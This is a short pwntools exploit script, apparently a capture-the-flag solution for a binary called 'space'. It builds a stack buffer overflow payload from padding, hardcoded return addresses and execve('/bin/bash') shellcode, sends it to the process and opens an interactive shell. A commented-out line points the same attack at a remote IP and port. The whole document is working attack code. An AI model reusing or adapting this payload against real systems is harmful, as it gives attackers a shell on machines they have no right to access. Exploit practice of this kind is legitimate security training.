from pwn import *



# p = remote("188.166.173.208", 30217)
p = process("./space")

# payload = b'A'*18 + p32(jmp_esp_addr)  + asm(shellcraft.execve('/bin/bash')) + b'B'*10
payload1 = b'A' * 10 + p32(0x804b2c4) + b'A' * 4 + p32(0x08049217) + p32(0x01010101) + b'B'*5
payload2 = b'A' * 18 + p32(0x01010101) + asm(shellcraft.execve('/bin/bash'))
payload = payload1 + payload2
p.recv()
p.sendline(payload)
print(p.recv)
p.interactive()

# 0xff8fe950